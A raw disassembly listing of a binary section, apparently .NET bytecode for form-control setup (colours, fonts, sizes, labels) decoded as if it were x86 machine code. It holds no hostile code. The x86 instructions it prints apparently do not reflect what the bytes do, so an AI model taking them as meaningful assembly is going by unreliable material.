  403f5d:	00 00                	add    %al,(%eax)
  403f5f:	0a 00                	or     (%eax),%al
  403f61:	02 7b 1a             	add    0x1a(%ebx),%bh
  403f64:	00 00                	add    %al,(%eax)
  403f66:	04 1f                	add    $0x1f,%al
  403f68:	12 6f 3a             	adc    0x3a(%edi),%ch
  403f6b:	00 00                	add    %al,(%eax)
  403f6d:	0a 00                	or     (%eax),%al
  403f6f:	02 7b 1a             	add    0x1a(%ebx),%bh
  403f72:	00 00                	add    %al,(%eax)
  403f74:	04 72                	add    $0x72,%al
  403f76:	19 04 00             	sbb    %eax,(%eax,%eax,1)
  403f79:	70 6f                	jo     0x403fea
  403f7b:	47                   	inc    %edi
  403f7c:	00 00                	add    %al,(%eax)
  403f7e:	0a 00                	or     (%eax),%al
  403f80:	02 7b 1a             	add    0x1a(%ebx),%bh
  403f83:	00 00                	add    %al,(%eax)
  403f85:	04 18                	add    $0x18,%al
  403f87:	6f                   	outsl  %ds:(%esi),(%dx)
  403f88:	50                   	push   %eax
  403f89:	00 00                	add    %al,(%eax)
  403f8b:	0a 00                	or     (%eax),%al
  403f8d:	02 7b 1a             	add    0x1a(%ebx),%bh
  403f90:	00 00                	add    %al,(%eax)
  403f92:	04 16                	add    $0x16,%al
  403f94:	6f                   	outsl  %ds:(%esi),(%dx)
  403f95:	48                   	dec    %eax
  403f96:	00 00                	add    %al,(%eax)
  403f98:	0a 00                	or     (%eax),%al
  403f9a:	02 7b 1a             	add    0x1a(%ebx),%bh
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	04 02                	add    $0x2,%al
  403fa1:	fe 06                	incb   (%esi)
  403fa3:	0f 00 00             	sldt   (%eax)
  403fa6:	06                   	push   %es
  403fa7:	73 49                	jae    0x403ff2
  403fa9:	00 00                	add    %al,(%eax)
  403fab:	0a 6f 4a             	or     0x4a(%edi),%ch
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	0a 00                	or     (%eax),%al
  403fb2:	02 7b 1b             	add    0x1b(%ebx),%bh
  403fb5:	00 00                	add    %al,(%eax)
  403fb7:	04 17                	add    $0x17,%al
  403fb9:	6f                   	outsl  %ds:(%esi),(%dx)
  403fba:	3e 00 00             	add    %al,%ds:(%eax)
  403fbd:	0a 00                	or     (%eax),%al
  403fbf:	02 7b 1b             	add    0x1b(%ebx),%bh
  403fc2:	00 00                	add    %al,(%eax)
  403fc4:	04 20                	add    $0x20,%al
  403fc6:	d8 00                	fadds  (%eax)
  403fc8:	00 00                	add    %al,(%eax)
  403fca:	16                   	push   %ss
  403fcb:	1f                   	pop    %ds
  403fcc:	32 28                	xor    (%eax),%ch
  403fce:	32 00                	xor    (%eax),%al
  403fd0:	00 0a                	add    %cl,(%edx)
  403fd2:	6f                   	outsl  %ds:(%esi),(%dx)
  403fd3:	33 00                	xor    (%eax),%eax
  403fd5:	00 0a                	add    %cl,(%edx)
  403fd7:	00 02                	add    %al,(%edx)
  403fd9:	7b 1b                	jnp    0x403ff6
  403fdb:	00 00                	add    %al,(%eax)
  403fdd:	04 6f                	add    $0x6f,%al
  403fdf:	3f                   	aas
  403fe0:	00 00                	add    %al,(%eax)
  403fe2:	0a 20                	or     (%eax),%ah
  403fe4:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403fea:	00 00                	add    %al,(%eax)
  403fec:	00 20                	add    %ah,(%eax)
  403fee:	a2 00 00 00 28       	mov    %al,0x28000000
  403ff3:	32 00                	xor    (%eax),%al
  403ff5:	00 0a                	add    %cl,(%edx)
  403ff7:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff8:	40                   	inc    %eax
  403ff9:	00 00                	add    %al,(%eax)
  403ffb:	0a 00                	or     (%eax),%al
  403ffd:	02 7b 1b             	add    0x1b(%ebx),%bh
  404000:	00 00                	add    %al,(%eax)
  404002:	04 6f                	add    $0x6f,%al
  404004:	3f                   	aas
  404005:	00 00                	add    %al,(%eax)
  404007:	0a 20                	or     (%eax),%ah
  404009:	d8 00                	fadds  (%eax)
  40400b:	00 00                	add    %al,(%eax)
  40400d:	16                   	push   %ss
  40400e:	1f                   	pop    %ds
  40400f:	32 28                	xor    (%eax),%ch
  404011:	32 00                	xor    (%eax),%al
  404013:	00 0a                	add    %cl,(%edx)
  404015:	6f                   	outsl  %ds:(%esi),(%dx)
  404016:	41                   	inc    %ecx
  404017:	00 00                	add    %al,(%eax)
  404019:	0a 00                	or     (%eax),%al
  40401b:	02 7b 1b             	add    0x1b(%ebx),%bh
  40401e:	00 00                	add    %al,(%eax)
  404020:	04 6f                	add    $0x6f,%al
  404022:	3f                   	aas
  404023:	00 00                	add    %al,(%eax)
  404025:	0a 20                	or     (%eax),%ah
  404027:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  40402d:	00 00                	add    %al,(%eax)
  40402f:	00 20                	add    %ah,(%eax)
  404031:	a2 00 00 00 28       	mov    %al,0x28000000
  404036:	32 00                	xor    (%eax),%al
  404038:	00 0a                	add    %cl,(%edx)
  40403a:	6f                   	outsl  %ds:(%esi),(%dx)
  40403b:	42                   	inc    %edx
  40403c:	00 00                	add    %al,(%eax)
  40403e:	0a 00                	or     (%eax),%al
  404040:	02 7b 1b             	add    0x1b(%ebx),%bh
  404043:	00 00                	add    %al,(%eax)
  404045:	04 16                	add    $0x16,%al
  404047:	6f                   	outsl  %ds:(%esi),(%dx)
  404048:	43                   	inc    %ebx
  404049:	00 00                	add    %al,(%eax)
  40404b:	0a 00                	or     (%eax),%al
  40404d:	02 7b 1b             	add    0x1b(%ebx),%bh
  404050:	00 00                	add    %al,(%eax)
  404052:	04 72                	add    $0x72,%al
  404054:	eb 01                	jmp    0x404057
  404056:	00 70 22             	add    %dh,0x22(%eax)
  404059:	00 00                	add    %al,(%eax)
  40405b:	10 41 16             	adc    %al,0x16(%ecx)
  40405e:	19 20                	sbb    %esp,(%eax)
  404060:	a2 00 00 00 73       	mov    %al,0x73000000
  404065:	44                   	inc    %esp
  404066:	00 00                	add    %al,(%eax)
  404068:	0a 6f 45             	or     0x45(%edi),%ch
  40406b:	00 00                	add    %al,(%eax)
  40406d:	0a 00                	or     (%eax),%al
  40406f:	02 7b 1b             	add    0x1b(%ebx),%bh
  404072:	00 00                	add    %al,(%eax)
  404074:	04 20                	add    $0x20,%al
  404076:	f9                   	stc
  404077:	00 00                	add    %al,(%eax)
  404079:	00 20                	add    %ah,(%eax)
  40407b:	de 00                	fiadds (%eax)
  40407d:	00 00                	add    %al,(%eax)
  40407f:	20 c9                	and    %cl,%cl
  404081:	00 00                	add    %al,(%eax)
  404083:	00 28                	add    %ch,(%eax)
  404085:	32 00                	xor    (%eax),%al
  404087:	00 0a                	add    %cl,(%edx)
  404089:	6f                   	outsl  %ds:(%esi),(%dx)
  40408a:	46                   	inc    %esi
  40408b:	00 00                	add    %al,(%eax)
  40408d:	0a 00                	or     (%eax),%al
  40408f:	02 7b 1b             	add    0x1b(%ebx),%bh
  404092:	00 00                	add    %al,(%eax)
  404094:	04 1d                	add    $0x1d,%al
  404096:	20 c6                	and    %al,%dh
  404098:	00 00                	add    %al,(%eax)
  40409a:	00 73 35             	add    %dh,0x35(%ebx)
  40409d:	00 00                	add    %al,(%eax)
  40409f:	0a 6f 36             	or     0x36(%edi),%ch
  4040a2:	00 00                	add    %al,(%eax)
  4040a4:	0a 00                	or     (%eax),%al
  4040a6:	02 7b 1b             	add    0x1b(%ebx),%bh
  4040a9:	00 00                	add    %al,(%eax)
  4040ab:	04 72                	add    $0x72,%al
  4040ad:	33 04 00             	xor    (%eax,%eax,1),%eax
  4040b0:	70 6f                	jo     0x404121
  4040b2:	37                   	aaa
  4040b3:	00 00                	add    %al,(%eax)
  4040b5:	0a 00                	or     (%eax),%al
  4040b7:	02 7b 1b             	add    0x1b(%ebx),%bh
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 20                	add    $0x20,%al
  4040be:	94                   	xchg   %eax,%esp
  4040bf:	00 00                	add    %al,(%eax)
  4040c1:	00 1f                	add    %bl,(%edi)
  4040c3:	1b 73 38             	sbb    0x38(%ebx),%esi
  4040c6:	00 00                	add    %al,(%eax)
  4040c8:	0a 6f 39             	or     0x39(%edi),%ch
  4040cb:	00 00                	add    %al,(%eax)
  4040cd:	0a 00                	or     (%eax),%al
  4040cf:	02 7b 1b             	add    0x1b(%ebx),%bh
  4040d2:	00 00                	add    %al,(%eax)
  4040d4:	04 1f                	add    $0x1f,%al
  4040d6:	11 6f 3a             	adc    %ebp,0x3a(%edi)
  4040d9:	00 00                	add    %al,(%eax)
  4040db:	0a 00                	or     (%eax),%al
  4040dd:	02 7b 1b             	add    0x1b(%ebx),%bh
  4040e0:	00 00                	add    %al,(%eax)
  4040e2:	04 72                	add    $0x72,%al
  4040e4:	45                   	inc    %ebp
  4040e5:	04 00                	add    $0x0,%al
  4040e7:	70 6f                	jo     0x404158
  4040e9:	47                   	inc    %edi
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	0a 00                	or     (%eax),%al
  4040ee:	02 7b 1b             	add    0x1b(%ebx),%bh
  4040f1:	00 00                	add    %al,(%eax)
  4040f3:	04 18                	add    $0x18,%al
  4040f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4040f6:	50                   	push   %eax
  4040f7:	00 00                	add    %al,(%eax)
  4040f9:	0a 00                	or     (%eax),%al
  4040fb:	02 7b 1b             	add    0x1b(%ebx),%bh
  4040fe:	00 00                	add    %al,(%eax)
  404100:	04 16                	add    $0x16,%al
  404102:	6f                   	outsl  %ds:(%esi),(%dx)
  404103:	48                   	dec    %eax
  404104:	00 00                	add    %al,(%eax)
  404106:	0a 00                	or     (%eax),%al
  404108:	02 7b 1b             	add    0x1b(%ebx),%bh
  40410b:	00 00                	add    %al,(%eax)
  40410d:	04 02                	add    $0x2,%al
  40410f:	fe 06                	incb   (%esi)
  404111:	0e                   	push   %cs
  404112:	00 00                	add    %al,(%eax)
  404114:	06                   	push   %es
  404115:	73 49                	jae    0x404160
  404117:	00 00                	add    %al,(%eax)
  404119:	0a 6f 4a             	or     0x4a(%edi),%ch
  40411c:	00 00                	add    %al,(%eax)
  40411e:	0a 00                	or     (%eax),%al
  404120:	02 7b 1c             	add    0x1c(%ebx),%bh
  404123:	00 00                	add    %al,(%eax)
  404125:	04 17                	add    $0x17,%al
  404127:	6f                   	outsl  %ds:(%esi),(%dx)
  404128:	3e 00 00             	add    %al,%ds:(%eax)
  40412b:	0a 00                	or     (%eax),%al
  40412d:	02 7b 1c             	add    0x1c(%ebx),%bh
  404130:	00 00                	add    %al,(%eax)
  404132:	04 20                	add    $0x20,%al
  404134:	d8 00                	fadds  (%eax)
  404136:	00 00                	add    %al,(%eax)
  404138:	16                   	push   %ss
  404139:	1f                   	pop    %ds
  40413a:	32 28                	xor    (%eax),%ch
  40413c:	32 00                	xor    (%eax),%al
  40413e:	00 0a                	add    %cl,(%edx)
  404140:	6f                   	outsl  %ds:(%esi),(%dx)
  404141:	33 00                	xor    (%eax),%eax
  404143:	00 0a                	add    %cl,(%edx)
  404145:	00 02                	add    %al,(%edx)
  404147:	7b 1c                	jnp    0x404165
  404149:	00 00                	add    %al,(%eax)
  40414b:	04 6f                	add    $0x6f,%al
  40414d:	3f                   	aas
  40414e:	00 00                	add    %al,(%eax)
  404150:	0a 20                	or     (%eax),%ah
  404152:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  404158:	00 00                	add    %al,(%eax)
  40415a:	00 20                	add    %ah,(%eax)
  40415c:	a2 00 00 00 28       	mov    %al,0x28000000
  404161:	32 00                	xor    (%eax),%al
  404163:	00 0a                	add    %cl,(%edx)
  404165:	6f                   	outsl  %ds:(%esi),(%dx)
  404166:	40                   	inc    %eax
  404167:	00 00                	add    %al,(%eax)
  404169:	0a 00                	or     (%eax),%al
  40416b:	02 7b 1c             	add    0x1c(%ebx),%bh
  40416e:	00 00                	add    %al,(%eax)
  404170:	04 6f                	add    $0x6f,%al
  404172:	3f                   	aas
  404173:	00 00                	add    %al,(%eax)
  404175:	0a 20                	or     (%eax),%ah
  404177:	d8 00                	fadds  (%eax)
  404179:	00 00                	add    %al,(%eax)
  40417b:	16                   	push   %ss
  40417c:	1f                   	pop    %ds
  40417d:	32 28                	xor    (%eax),%ch
  40417f:	32 00                	xor    (%eax),%al
  404181:	00 0a                	add    %cl,(%edx)
  404183:	6f                   	outsl  %ds:(%esi),(%dx)
  404184:	41                   	inc    %ecx
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 00                	or     (%eax),%al
  404189:	02 7b 1c             	add    0x1c(%ebx),%bh
  40418c:	00 00                	add    %al,(%eax)
  40418e:	04 6f                	add    $0x6f,%al
  404190:	3f                   	aas
  404191:	00 00                	add    %al,(%eax)
  404193:	0a 20                	or     (%eax),%ah
  404195:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  40419b:	00 00                	add    %al,(%eax)
  40419d:	00 20                	add    %ah,(%eax)
  40419f:	a2 00 00 00 28       	mov    %al,0x28000000
  4041a4:	32 00                	xor    (%eax),%al
  4041a6:	00 0a                	add    %cl,(%edx)
  4041a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4041a9:	42                   	inc    %edx
  4041aa:	00 00                	add    %al,(%eax)
  4041ac:	0a 00                	or     (%eax),%al
  4041ae:	02 7b 1c             	add    0x1c(%ebx),%bh
  4041b1:	00 00                	add    %al,(%eax)
  4041b3:	04 16                	add    $0x16,%al
  4041b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b6:	43                   	inc    %ebx
  4041b7:	00 00                	add    %al,(%eax)
  4041b9:	0a 00                	or     (%eax),%al
  4041bb:	02 7b 1c             	add    0x1c(%ebx),%bh
  4041be:	00 00                	add    %al,(%eax)
  4041c0:	04 72                	add    $0x72,%al
  4041c2:	eb 01                	jmp    0x4041c5
  4041c4:	00 70 22             	add    %dh,0x22(%eax)
  4041c7:	00 00                	add    %al,(%eax)
  4041c9:	10 41 16             	adc    %al,0x16(%ecx)
  4041cc:	19 20                	sbb    %esp,(%eax)
  4041ce:	a2 00 00 00 73       	mov    %al,0x73000000
  4041d3:	44                   	inc    %esp
  4041d4:	00 00                	add    %al,(%eax)
  4041d6:	0a 6f 45             	or     0x45(%edi),%ch
  4041d9:	00 00                	add    %al,(%eax)
  4041db:	0a 00                	or     (%eax),%al
  4041dd:	02 7b 1c             	add    0x1c(%ebx),%bh
  4041e0:	00 00                	add    %al,(%eax)
  4041e2:	04 20                	add    $0x20,%al
  4041e4:	f9                   	stc
  4041e5:	00 00                	add    %al,(%eax)
  4041e7:	00 20                	add    %ah,(%eax)
  4041e9:	de 00                	fiadds (%eax)
  4041eb:	00 00                	add    %al,(%eax)
  4041ed:	20 c9                	and    %cl,%cl
  4041ef:	00 00                	add    %al,(%eax)
  4041f1:	00 28                	add    %ch,(%eax)
  4041f3:	32 00                	xor    (%eax),%al
  4041f5:	00 0a                	add    %cl,(%edx)
  4041f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f8:	46                   	inc    %esi
  4041f9:	00 00                	add    %al,(%eax)
  4041fb:	0a 00                	or     (%eax),%al
  4041fd:	02 7b 1c             	add    0x1c(%ebx),%bh
  404200:	00 00                	add    %al,(%eax)
  404202:	04 1f                	add    $0x1f,%al
  404204:	22 20                	and    (%eax),%ah
  404206:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404207:	00 00                	add    %al,(%eax)
  404209:	00 73 35             	add    %dh,0x35(%ebx)
  40420c:	00 00                	add    %al,(%eax)
  40420e:	0a 6f 36             	or     0x36(%edi),%ch
  404211:	00 00                	add    %al,(%eax)
  404213:	0a 00                	or     (%eax),%al
  404215:	02 7b 1c             	add    0x1c(%ebx),%bh
  404218:	00 00                	add    %al,(%eax)
  40421a:	04 72                	add    $0x72,%al
  40421c:	75 04                	jne    0x404222
  40421e:	00 70 6f             	add    %dh,0x6f(%eax)
  404221:	37                   	aaa
  404222:	00 00                	add    %al,(%eax)
  404224:	0a 00                	or     (%eax),%al
  404226:	02 7b 1c             	add    0x1c(%ebx),%bh
  404229:	00 00                	add    %al,(%eax)
  40422b:	04 1f                	add    $0x1f,%al
  40422d:	5f                   	pop    %edi
  40422e:	1f                   	pop    %ds
  40422f:	1b 73 38             	sbb    0x38(%ebx),%esi
  404232:	00 00                	add    %al,(%eax)
  404234:	0a 6f 39             	or     0x39(%edi),%ch
  404237:	00 00                	add    %al,(%eax)
  404239:	0a 00                	or     (%eax),%al
  40423b:	02 7b 1c             	add    0x1c(%ebx),%bh
  40423e:	00 00                	add    %al,(%eax)
  404240:	04 1f                	add    $0x1f,%al
  404242:	10 6f 3a             	adc    %ch,0x3a(%edi)
  404245:	00 00                	add    %al,(%eax)
  404247:	0a 00                	or     (%eax),%al
  404249:	02 7b 1c             	add    0x1c(%ebx),%bh
  40424c:	00 00                	add    %al,(%eax)
  40424e:	04 72                	add    $0x72,%al
  404250:	87 04 00             	xchg   %eax,(%eax,%eax,1)
  404253:	70 6f                	jo     0x4042c4
  404255:	47                   	inc    %edi
  404256:	00 00                	add    %al,(%eax)
  404258:	0a 00                	or     (%eax),%al
  40425a:	02 7b 1c             	add    0x1c(%ebx),%bh
  40425d:	00 00                	add    %al,(%eax)
  40425f:	04 18                	add    $0x18,%al
  404261:	6f                   	outsl  %ds:(%esi),(%dx)
  404262:	50                   	push   %eax
  404263:	00 00                	add    %al,(%eax)
  404265:	0a 00                	or     (%eax),%al
  404267:	02 7b 1c             	add    0x1c(%ebx),%bh
  40426a:	00 00                	add    %al,(%eax)
  40426c:	04 16                	add    $0x16,%al
  40426e:	6f                   	outsl  %ds:(%esi),(%dx)
  40426f:	48                   	dec    %eax
  404270:	00 00                	add    %al,(%eax)
  404272:	0a 00                	or     (%eax),%al
  404274:	02 7b 1c             	add    0x1c(%ebx),%bh
  404277:	00 00                	add    %al,(%eax)
  404279:	04 02                	add    $0x2,%al
  40427b:	fe 06                	incb   (%esi)
  40427d:	0d 00 00 06 73       	or     $0x73060000,%eax
  404282:	49                   	dec    %ecx
  404283:	00 00                	add    %al,(%eax)
  404285:	0a 6f 4a             	or     0x4a(%edi),%ch
  404288:	00 00                	add    %al,(%eax)
  40428a:	0a 00                	or     (%eax),%al
  40428c:	02 7b 1d             	add    0x1d(%ebx),%bh
  40428f:	00 00                	add    %al,(%eax)
  404291:	04 17                	add    $0x17,%al
  404293:	6f                   	outsl  %ds:(%esi),(%dx)
  404294:	3e 00 00             	add    %al,%ds:(%eax)
  404297:	0a 00                	or     (%eax),%al
  404299:	02 7b 1d             	add    0x1d(%ebx),%bh
  40429c:	00 00                	add    %al,(%eax)
  40429e:	04 20                	add    $0x20,%al
  4042a0:	d8 00                	fadds  (%eax)
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	16                   	push   %ss
  4042a5:	1f                   	pop    %ds
  4042a6:	32 28                	xor    (%eax),%ch
  4042a8:	32 00                	xor    (%eax),%al
  4042aa:	00 0a                	add    %cl,(%edx)
  4042ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ad:	33 00                	xor    (%eax),%eax
  4042af:	00 0a                	add    %cl,(%edx)
  4042b1:	00 02                	add    %al,(%edx)
  4042b3:	7b 1d                	jnp    0x4042d2
  4042b5:	00 00                	add    %al,(%eax)
  4042b7:	04 6f                	add    $0x6f,%al
  4042b9:	3f                   	aas
  4042ba:	00 00                	add    %al,(%eax)
  4042bc:	0a 20                	or     (%eax),%ah
  4042be:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4042c4:	00 00                	add    %al,(%eax)
  4042c6:	00 20                	add    %ah,(%eax)
  4042c8:	a2 00 00 00 28       	mov    %al,0x28000000
  4042cd:	32 00                	xor    (%eax),%al
  4042cf:	00 0a                	add    %cl,(%edx)
  4042d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4042d2:	40                   	inc    %eax
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	0a 00                	or     (%eax),%al
  4042d7:	02 7b 1d             	add    0x1d(%ebx),%bh
  4042da:	00 00                	add    %al,(%eax)
  4042dc:	04 6f                	add    $0x6f,%al
  4042de:	3f                   	aas
  4042df:	00 00                	add    %al,(%eax)
  4042e1:	0a 20                	or     (%eax),%ah
  4042e3:	d8 00                	fadds  (%eax)
  4042e5:	00 00                	add    %al,(%eax)
  4042e7:	16                   	push   %ss
  4042e8:	1f                   	pop    %ds
  4042e9:	32 28                	xor    (%eax),%ch
  4042eb:	32 00                	xor    (%eax),%al
  4042ed:	00 0a                	add    %cl,(%edx)
  4042ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4042f0:	41                   	inc    %ecx
  4042f1:	00 00                	add    %al,(%eax)
  4042f3:	0a 00                	or     (%eax),%al
  4042f5:	02 7b 1d             	add    0x1d(%ebx),%bh
  4042f8:	00 00                	add    %al,(%eax)
  4042fa:	04 6f                	add    $0x6f,%al
  4042fc:	3f                   	aas
  4042fd:	00 00                	add    %al,(%eax)
  4042ff:	0a 20                	or     (%eax),%ah
  404301:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  404307:	00 00                	add    %al,(%eax)
  404309:	00 20                	add    %ah,(%eax)
  40430b:	a2 00 00 00 28       	mov    %al,0x28000000
  404310:	32 00                	xor    (%eax),%al
  404312:	00 0a                	add    %cl,(%edx)
  404314:	6f                   	outsl  %ds:(%esi),(%dx)
  404315:	42                   	inc    %edx
  404316:	00 00                	add    %al,(%eax)
  404318:	0a 00                	or     (%eax),%al
  40431a:	02 7b 1d             	add    0x1d(%ebx),%bh
  40431d:	00 00                	add    %al,(%eax)
  40431f:	04 16                	add    $0x16,%al
  404321:	6f                   	outsl  %ds:(%esi),(%dx)
  404322:	43                   	inc    %ebx
  404323:	00 00                	add    %al,(%eax)
  404325:	0a 00                	or     (%eax),%al
  404327:	02 7b 1d             	add    0x1d(%ebx),%bh
  40432a:	00 00                	add    %al,(%eax)
  40432c:	04 72                	add    $0x72,%al
  40432e:	eb 01                	jmp    0x404331
  404330:	00 70 22             	add    %dh,0x22(%eax)
  404333:	00 00                	add    %al,(%eax)
  404335:	10 41 16             	adc    %al,0x16(%ecx)
  404338:	19 20                	sbb    %esp,(%eax)
  40433a:	a2 00 00 00 73       	mov    %al,0x73000000
  40433f:	44                   	inc    %esp
  404340:	00 00                	add    %al,(%eax)
  404342:	0a 6f 45             	or     0x45(%edi),%ch
  404345:	00 00                	add    %al,(%eax)
  404347:	0a 00                	or     (%eax),%al
  404349:	02 7b 1d             	add    0x1d(%ebx),%bh
  40434c:	00 00                	add    %al,(%eax)
  40434e:	04 20                	add    $0x20,%al
  404350:	f9                   	stc
  404351:	00 00                	add    %al,(%eax)
  404353:	00 20                	add    %ah,(%eax)
  404355:	de 00                	fiadds (%eax)
  404357:	00 00                	add    %al,(%eax)
  404359:	20 c9                	and    %cl,%cl
  40435b:	00 00                	add    %al,(%eax)
  40435d:	00 28                	add    %ch,(%eax)
  40435f:	32 00                	xor    (%eax),%al
  404361:	00 0a                	add    %cl,(%edx)
  404363:	6f                   	outsl  %ds:(%esi),(%dx)
  404364:	46                   	inc    %esi
  404365:	00 00                	add    %al,(%eax)
  404367:	0a 00                	or     (%eax),%al
  404369:	02 7b 1d             	add    0x1d(%ebx),%bh
  40436c:	00 00                	add    %al,(%eax)
  40436e:	04 1f                	add    $0x1f,%al
  404370:	1d 20 84 00 00       	sbb    $0x8420,%eax
  404375:	00 73 35             	add    %dh,0x35(%ebx)
  404378:	00 00                	add    %al,(%eax)
  40437a:	0a 6f 36             	or     0x36(%edi),%ch
  40437d:	00 00                	add    %al,(%eax)
  40437f:	0a 00                	or     (%eax),%al
  404381:	02 7b 1d             	add    0x1d(%ebx),%bh
  404384:	00 00                	add    %al,(%eax)
  404386:	04 72                	add    $0x72,%al
  404388:	a3 04 00 70 6f       	mov    %eax,0x6f700004
  40438d:	37                   	aaa
  40438e:	00 00                	add    %al,(%eax)
  404390:	0a 00                	or     (%eax),%al
  404392:	02 7b 1d             	add    0x1d(%ebx),%bh
  404395:	00 00                	add    %al,(%eax)
  404397:	04 16                	add    $0x16,%al
  404399:	6f                   	outsl  %ds:(%esi),(%dx)
  40439a:	53                   	push   %ebx
  40439b:	00 00                	add    %al,(%eax)
  40439d:	0a 00                	or     (%eax),%al
  40439f:	02 7b 1d             	add    0x1d(%ebx),%bh
  4043a2:	00 00                	add    %al,(%eax)
  4043a4:	04 1f                	add    $0x1f,%al
  4043a6:	68 1f 1b 73 38       	push   $0x38731b1f
  4043ab:	00 00                	add    %al,(%eax)
  4043ad:	0a 6f 39             	or     0x39(%edi),%ch
  4043b0:	00 00                	add    %al,(%eax)
  4043b2:	0a 00                	or     (%eax),%al
  4043b4:	02 7b 1d             	add    0x1d(%ebx),%bh
  4043b7:	00 00                	add    %al,(%eax)
  4043b9:	04 1f                	add    $0x1f,%al
  4043bb:	0f 6f 3a             	movq   (%edx),%mm7
  4043be:	00 00                	add    %al,(%eax)
  4043c0:	0a 00                	or     (%eax),%al
  4043c2:	02 7b 1d             	add    0x1d(%ebx),%bh
  4043c5:	00 00                	add    %al,(%eax)
  4043c7:	04 72                	add    $0x72,%al
  4043c9:	b5 04                	mov    $0x4,%ch
  4043cb:	00 70 6f             	add    %dh,0x6f(%eax)
  4043ce:	47                   	inc    %edi
  4043cf:	00 00                	add    %al,(%eax)
  4043d1:	0a 00                	or     (%eax),%al
  4043d3:	02 7b 1d             	add    0x1d(%ebx),%bh
  4043d6:	00 00                	add    %al,(%eax)
  4043d8:	04 18                	add    $0x18,%al
  4043da:	6f                   	outsl  %ds:(%esi),(%dx)
  4043db:	50                   	push   %eax
  4043dc:	00 00                	add    %al,(%eax)
  4043de:	0a 00                	or     (%eax),%al
  4043e0:	02 7b 1d             	add    0x1d(%ebx),%bh
  4043e3:	00 00                	add    %al,(%eax)
  4043e5:	04 16                	add    $0x16,%al
  4043e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4043e8:	48                   	dec    %eax
  4043e9:	00 00                	add    %al,(%eax)
  4043eb:	0a 00                	or     (%eax),%al
  4043ed:	02 7b 1d             	add    0x1d(%ebx),%bh
  4043f0:	00 00                	add    %al,(%eax)
  4043f2:	04 02                	add    $0x2,%al
  4043f4:	fe 06                	incb   (%esi)
  4043f6:	0c 00                	or     $0x0,%al
  4043f8:	00 06                	add    %al,(%esi)
  4043fa:	73 49                	jae    0x404445
  4043fc:	00 00                	add    %al,(%eax)
  4043fe:	0a 6f 4a             	or     0x4a(%edi),%ch
  404401:	00 00                	add    %al,(%eax)
  404403:	0a 00                	or     (%eax),%al
  404405:	02 7b 1e             	add    0x1e(%ebx),%bh
  404408:	00 00                	add    %al,(%eax)
  40440a:	04 17                	add    $0x17,%al
  40440c:	6f                   	outsl  %ds:(%esi),(%dx)
  40440d:	3e 00 00             	add    %al,%ds:(%eax)
  404410:	0a 00                	or     (%eax),%al
  404412:	02 7b 1e             	add    0x1e(%ebx),%bh
  404415:	00 00                	add    %al,(%eax)
  404417:	04 20                	add    $0x20,%al
  404419:	d8 00                	fadds  (%eax)
  40441b:	00 00                	add    %al,(%eax)
  40441d:	16                   	push   %ss
  40441e:	1f                   	pop    %ds
  40441f:	32 28                	xor    (%eax),%ch
  404421:	32 00                	xor    (%eax),%al
  404423:	00 0a                	add    %cl,(%edx)
  404425:	6f                   	outsl  %ds:(%esi),(%dx)
  404426:	33 00                	xor    (%eax),%eax
  404428:	00 0a                	add    %cl,(%edx)
  40442a:	00 02                	add    %al,(%edx)
  40442c:	7b 1e                	jnp    0x40444c
  40442e:	00 00                	add    %al,(%eax)
  404430:	04 6f                	add    $0x6f,%al
  404432:	3f                   	aas
  404433:	00 00                	add    %al,(%eax)
  404435:	0a 20                	or     (%eax),%ah
  404437:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 20                	add    %ah,(%eax)
  404441:	a2 00 00 00 28       	mov    %al,0x28000000
  404446:	32 00                	xor    (%eax),%al
  404448:	00 0a                	add    %cl,(%edx)
  40444a:	6f                   	outsl  %ds:(%esi),(%dx)
  40444b:	40                   	inc    %eax
  40444c:	00 00                	add    %al,(%eax)
  40444e:	0a 00                	or     (%eax),%al
  404450:	02 7b 1e             	add    0x1e(%ebx),%bh
  404453:	00 00                	add    %al,(%eax)
  404455:	04 6f                	add    $0x6f,%al
  404457:	3f                   	aas
  404458:	00 00                	add    %al,(%eax)
  40445a:	0a 20                	or     (%eax),%ah
  40445c:	d8 00                	fadds  (%eax)
  40445e:	00 00                	add    %al,(%eax)
  404460:	16                   	push   %ss
  404461:	1f                   	pop    %ds
  404462:	32 28                	xor    (%eax),%ch
  404464:	32 00                	xor    (%eax),%al
  404466:	00 0a                	add    %cl,(%edx)
  404468:	6f                   	outsl  %ds:(%esi),(%dx)
  404469:	41                   	inc    %ecx
  40446a:	00 00                	add    %al,(%eax)
  40446c:	0a 00                	or     (%eax),%al
  40446e:	02 7b 1e             	add    0x1e(%ebx),%bh
  404471:	00 00                	add    %al,(%eax)
  404473:	04 6f                	add    $0x6f,%al
  404475:	3f                   	aas
  404476:	00 00                	add    %al,(%eax)
  404478:	0a 20                	or     (%eax),%ah
  40447a:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  404480:	00 00                	add    %al,(%eax)
  404482:	00 20                	add    %ah,(%eax)
  404484:	a2 00 00 00 28       	mov    %al,0x28000000
  404489:	32 00                	xor    (%eax),%al
  40448b:	00 0a                	add    %cl,(%edx)
  40448d:	6f                   	outsl  %ds:(%esi),(%dx)
  40448e:	42                   	inc    %edx
  40448f:	00 00                	add    %al,(%eax)
  404491:	0a 00                	or     (%eax),%al
